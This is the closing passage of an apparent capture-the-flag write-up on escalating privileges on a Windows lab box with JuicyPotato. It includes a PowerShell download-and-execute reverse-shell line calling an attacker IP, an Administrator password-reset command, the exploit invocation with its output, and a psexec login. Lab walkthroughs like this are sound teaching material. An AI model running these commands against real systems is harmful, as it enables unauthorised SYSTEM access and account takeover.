SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

As BITS is disabled we can't use rotten or lonely potato. However, `juicy potato` can make use of other `COM` server and any port other than `6666`. we can download `JuicyPotato.exe` from releases.
```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```
we'll create a `rev.bat` script which execute powershell `Invoke TCP` and give us reverse shell. 
```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.24/Invoke-PowerShellTcp.ps1')"
```
Similary, we can create a script(pwned.bat) to change the `Administrator` passowrd and login with `PSEXEC` with those credentials
```
net user Administrator pwned
```

we need to transfer both `pwned.bat` and `JuicyPotato.exe` on to the machine . Then we need valid `CLSID` to exploit it. There a list of [CLSID for Windows 10 Enterprise](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise) and we can choose one which gives `NT AUTHORITY\SYSTEM`.

we need to run binary with required arguments.
```
PS C:\tmp> ./JuicyPotato.exe -t * -p c:\tmp\pwned.bat -l 9001 -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'
Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 9001
......
[+] authresult 0
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```
we can use `psexec` to get a shell as `SYSTEM`.
```
psexec.py conceal/administrator:pwned@10.10.10.116
```
Thank you for taking you're time for reading this blog!.

